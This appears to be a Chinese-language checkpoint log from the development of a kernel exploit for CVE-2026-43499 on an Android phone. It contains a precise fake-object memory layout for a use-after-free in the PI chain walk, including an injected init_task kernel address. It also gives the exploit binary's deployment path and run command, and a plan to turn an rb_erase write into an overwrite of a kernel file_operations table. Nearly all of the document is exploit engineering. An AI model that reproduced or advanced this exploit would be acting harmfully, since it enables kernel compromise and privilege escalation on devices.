# CHECKPOINT v38 — init_task 替换 NULL task (2026-07-16 晚)

## 背景
v37 NULL task (buf[6]=0) → 手机重启 → 证实 PI chain walk 读到了 stamp 数据。
下一步: 替换为有效 task 指针，验证链能否走完不崩。

## v38 改动 (trigger_stamp.c)

### 核心改动
- `buf[6]`: `0` → `INIT_TASK_DMAP` = `0xffffff800279bec0`
  - 来自 kallsyms 验证: init_task direct-map 地址
  - 所有 task_struct 字段有效 → 不会因无效指针崩溃

### stamp 布局 (512 bytes, 64×uint64)
| word | 偏移 | 字段 | v38 值 | 说明 |
|------|------|------|--------|------|
| 0 | +0x00 | tree_entry.__rb_parent_color | OFF\|RED | rb_erase→写name_ptr(无害) |
| 1 | +0x08 | tree_entry.rb_right | 0xCAFE000000000001 | 写入name_ptr的值 |
| 2 | +0x10 | tree_entry.rb_left | 0 | Path A (left=NULL) |
| 3 | +0x18 | pi_tree_entry.__rb_parent_color | OFF\|RED | 第2次rb_erase |
| 4 | +0x20 | pi_tree_entry.rb_right | 0xCAFE000000000002 | |
| 5 | +0x28 | pi_tree_entry.rb_left | 0 | |
| **6** | **+0x30** | **task** | **INIT_TASK_DMAP** | ★ 关键改动 |
| 7 | +0x38 | lock | 0xBEEF000000000000 | test1证明不崩 |
| 8 | +0x40 | prio | 120\|(139<<16) | 新增覆盖 |
| 9-63 | +0x48- | pattern | 0xDEAD+i | 填充 |

### 编译部署
- 源文件: `CVE-2026-43499_ref/trigger_stamp.c` (v38)
- 二进制: `CVE-2026-43499_ref/trigger_stamp_v38` (10080 bytes)
- SHA256: `70f55c3b685ac061f082195d919a2535d0361a62583f94ad4c0ba59f1c0fea96`
- 部署: `/data/local/tmp/trigger_stamp` ✅ SHA256 一致

## 预期三种结果

| 结果 | 含义 | 下一步 |
|------|------|--------|
| 不崩，UAF probe returned | init_task 有效 → PI chain walk 走完 | 改 parent=FOPS-8 试写 FOPS |
| 崩（非NULL deref） | chain walk 在其他字段上撞到无效数据 | 分析 crash 类型，修补字段 |
| 不崩但无效果 | stamp 没被读到（与 NULL task 冲突） | 重新审视 stamp 定位 |

## 测试命令
```bash
# rish 内 (必须先确认 Shizuku running!):
/data/local/tmp/trigger_stamp 2>&1 | tee /sdcard/Documents/matisse_backup_essentials/logs/trigger_stamp_v38_test1.txt
```

## 若成功 → v39 计划
- parent 从 OFF 改为 FOPS-8 (= OFF + 0x08)
- tree_right 设为目标值 (page_base + fake_fops_off)
- 验证 PI chain walk 中的 rb_erase 能否写 FOPS
- 若 rb_erase 能被触发 → 绕过 v 系列 csel 限制 → 直接覆写 FOPS
